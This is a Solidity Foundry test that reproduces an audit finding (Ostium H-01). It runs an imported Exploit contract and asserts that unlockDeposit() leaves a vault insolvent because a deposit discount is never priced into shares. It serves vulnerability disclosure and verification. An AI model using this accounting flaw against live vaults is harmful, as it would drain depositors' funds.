// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, OstiumVault, MiniToken, MarkerToken} from "./65199-h-01-function-unlockdeposit-adds-discounted-assets-as-trader.sol";

// Ostium H-01 (finding 65199): unlockDeposit() socializes a locked deposit's
// discount by adding it to the TRADER-PnL accumulator (accPnlPerTokenUsed).
// updateShareToAssetsPrice() only subtracts that accumulator from the price when
// it is POSITIVE, so in the normal over-collateralized state (accPnlPerTokenUsed
// <= 0) the discount is never priced in. The discounted shares stay in
// totalSupply while the price is untouched -> supply*price > backing assets:
// the vault is left insolvent.
contract Finding65199Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_unlockDeposit_leavesVaultInsolvent() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("share price before unlock", e.priceBefore());
        emit log_named_uint("share price after unlock ", e.priceAfter());
        emit log_named_int("accPnlPerTokenUsed after ", e.accPnlUsedAfter());
        emit log_named_uint("backing assets           ", e.physicalAssets());
        emit log_named_uint("market cap (supply*price)", e.mcap());
        emit log_named_uint("market cap if socialized ", e.correctMcap());
        emit log_named_uint("insolvency shortfall     ", e.shortfall());

        // the buggy socialization is a no-op on the price
        assertEq(e.priceAfter(), e.priceBefore(), "price must be unchanged (bug)");
        // ...precisely because accPnlPerTokenUsed stayed <= 0
        assertLe(e.accPnlUsedAfter(), int256(0), "accPnlPerTokenUsed must stay <= 0");
        // the vault cannot honor all shares at the stated price: insolvency
        assertGt(e.mcap(), e.physicalAssets(), "vault must be insolvent");
        // and had the discount been socialized correctly, it would be solvent
        assertLe(e.correctMcap(), e.physicalAssets(), "correct socialization would be solvent");

        // concrete harm surfaced to the SINK
        MarkerToken marker = e.marker();
        assertEq(marker.balanceOf(SINK), e.shortfall(), "shortfall minted to SINK");
        assertGt(marker.balanceOf(SINK), 0, "nonzero insolvency shortfall");

        emit log_named_uint("shortfall minted to SINK ", marker.balanceOf(SINK));
    }
}
